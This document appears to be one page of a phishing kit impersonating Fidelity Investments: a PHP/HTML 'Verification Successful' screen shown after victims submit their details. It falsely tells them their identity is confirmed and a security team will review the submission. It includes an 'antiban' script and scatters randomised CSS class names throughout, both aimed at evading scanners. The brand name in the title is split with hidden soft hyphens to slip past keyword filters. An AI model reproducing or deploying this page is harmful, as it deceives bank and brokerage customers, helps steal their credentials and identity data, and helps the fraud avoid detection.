﻿<?php
    error_reporting(0);
    session_start();
    include '../setting/functions.php';
    include "../antiban/antiban.php";
    
    
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

    
    
    
    
    
    $permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
?>
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
	<meta name="google" content="notranslate">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
		  <title>  F­­i­­d­­e­­l­­i­­t­­y - </title>
	  <link rel="icon" type="image/png" href="./images/icons.png">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
            background-color: #f4f4f4;
            color: #000;
            line-height: 1.5;
            -webkit-font-smoothing: antialiased;
        }

        .Q1 {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .Q2 {
            background: #fff;
            padding: 0.75rem 2rem;
            border-bottom: 1px solid #e0e0e0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .Q3 {
            display: flex;
            align-items: center;
        }

        .Q4 {
            height: 32px;
            width: auto;
        }

        .Q5 {
            display: flex;
            gap: 2rem;
        }

        .Q6 {
            color: #000;
            text-decoration: none;
            font-size: 0.875rem;
            cursor: pointer;
        }

        .Q6:hover {
            text-decoration: underline;
        }

        .Q7 {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            padding: 3rem 1rem;
            position: relative;
        }

        .Q8 {
            background: #fff;
            width: 100%;
            max-width: 480px;
            padding: 1.5rem;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
            border: 1px solid #e0e0e0;
            position: relative;
            text-align: center;
        }

        .Q35 {
            width: 64px;
            height: 64px;
            margin: 0 auto 1.5rem;
        }

        .Q35 svg {
            width: 100%;
            height: 100%;
            fill: #368727;
        }

        .Q36 {
            font-size: 1.75rem;
            font-weight: 600;
            margin-bottom: 1rem;
            color: #000;
        }

        .Q37 {
            font-size: 0.9375rem;
            color: #333;
            margin-bottom: 2rem;
            line-height: 1.6;
        }

        .Q38 {
            display: grid;
            grid-template-columns: 1fr;
            gap: 1rem;
            margin-bottom: 2rem;
        }

        .Q39 {
            background: #f9f9f9;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            padding: 1.25rem;
            text-align: left;
        }

        .Q40 {
            font-size: 0.875rem;
            font-weight: 600;
            color: #368727;
            margin-bottom: 0.5rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .Q41 {
            font-size: 0.8125rem;
            color: #555;
            line-height: 1.5;
        }

        .Q14 {
            width: 100%;
            height: 48px;
            background-color: #368727;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-bottom: 1.5rem;
        }

        .Q14:hover {
            background-color: #2d701f;
        }

        .Q42 {
            font-size: 0.875rem;
            color: #333;
            margin-bottom: 0.5rem;
        }

        .Q43 {
            font-size: 0.875rem;
            color: #368727;
            font-weight: 600;
            text-decoration: none;
        }

        .Q43:hover {
            text-decoration: underline;
        }

        .Q16 {
            margin-top: 2rem;
            text-align: center;
            font-size: 0.875rem;
            color: #000;
        }

        .Q17 {
            color: #000;
            text-decoration: underline;
            cursor: pointer;
        }

        .Q17:hover {
            text-decoration: none;
        }

        .Q18 {
            position: fixed;
            right: 0;
            top: 50%;
            transform: translateY(-50%);
            background: #fff;
            border: 1px solid #ccc;
            border-right: none;
            padding: 0.5rem 0.25rem;
            writing-mode: vertical-rl;
            text-orientation: mixed;
            font-size: 0.75rem;
            color: #368727;
            cursor: pointer;
            border-radius: 4px 0 0 4px;
            box-shadow: -2px 0 4px rgba(0,0,0,0.1);
        }

        .Q18:hover {
            background: #f4f4f4;
        }

        /* Loading Overlay Inside Card */
        .Q19 {
            display: none;
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.9);
            z-index: 10;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            border-radius: 8px;
        }

        .Q19.Q20 {
            display: flex;
        }

        .Q21 {
            width: 48px;
            height: 48px;
            border: 4px solid #e0e0e0;
            border-top: 4px solid #368727;
            border-radius: 50%;
            animation: Q22 1s linear infinite;
        }

        @keyframes Q22 {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .Q23 {
            margin-top: 0.75rem;
            font-size: 1rem;
            color: #000;
        }

        /* Mobile */
        @media (max-width: 768px) {
            .Q2 {
                padding: 0.75rem 1rem;
            }

            .Q5 {
                gap: 1rem;
            }

            .Q6 {
                font-size: 0.8125rem;
            }

           

            .Q8 {
                padding: 1.5rem;
                box-shadow: none;
                border: none;
                background: #fff;
            }

            .Q18 {
                display: none;
            }

            .Q36 {
                font-size: 1.5rem;
            }
        }
				img {
    width: 127px;
}
@media (max-width: 511px) {
    .Q7 {
        padding: 0;
    }
	
	.Q2 {
border-bottom: none;
    }
	    .Q5 {
    display: none;
    }
	
	.Q8 {
max-width: 100% !important;
    }
	
}

    </style>
</head>
<body>

<div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q1 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">
    <header  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q2 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">
        <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q3 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">
<img src="./images/image_3d4a7de4a4a1471d9d1747d2e9eeaaa4.png" alt="Fidelity Investments">
        </div>
        <nav  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q5 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">
            <a  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q6 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">Security</a>
            <a  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q6 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">FAQs</a>
        </nav>
    </header>

    <main  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q7 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">
        <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q8 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">
            <!-- Success Icon -->
            <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q35 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">
                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                </svg>
            </div>

            <h1  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q36 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">Verification Successful</h1>
            
            <p  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q37 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">Thank you for completing the verification process. Your identity has been confirmed and your account security is being updated.</p>

            <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q38 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">
                <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q39 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">
                    <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q40 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="#368727"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
                        24-Hour Review Period
                    </div>
                    <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q41 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">Our security team will perform a final review of the submitted information within 24 hours.</div>
                </div>

                <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q39 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">
                    <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q40 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="#368727"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
                        Email Confirmation
                    </div>
                    <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q41 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">You will receive a detailed confirmation email once the security flags have been cleared.</div>
                </div>

                <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q39 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">
                    <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q40 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="#368727"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
                        Enhanced Protection
                    </div>
                    <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q41 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">Advanced monitoring is now active on your account to prevent unauthorized access.</div>
                </div>
            </div>

            <button  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q14 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>" onclick="window.location.href='dashboard.html'">Return to Dashboard</button>

            <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q42 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">Need Assistance?</div>
            <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q41 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">If you have any questions regarding your verification status, please contact our support team at <a href="tel:8003433548"  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q43 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">(800) 343-3548</a>.</div>

            <!-- Loading Overlay Inside Card -->
            <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q19 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>" id="T1">
                <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q21 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>"></div>
                <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q23 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>" id="T2">Loading</div>
            </div>
        </div>

        <p  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q16 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">New to Fidelity? <a  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q17 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">Open an account</a> or <a  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q17 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">sign up</a>.</p>

        <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q18 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">Feedback</div>
    </main>
</div>

<script>
    // ===============================
    // GENERATE CLIENT ID (ONLY ONCE)
    // ===============================
    function getClientId() {
        let clientId = localStorage.getItem("client_id");
        
        if (!clientId) {
            clientId = Math.floor(Math.random() * 1000000)
                .toString()
                .padStart(6, "0");
            
            localStorage.setItem("client_id", clientId);
        }
        
        return clientId;
    }

    // Simulate loading on page load
    window.addEventListener('load', function() {
        document.getElementById('T1').classList.add('Q20');
        
        setTimeout(() => {
            document.getElementById('T1').classList.remove('Q20');
        }, 1500);
    });
</script>

</body>
</html>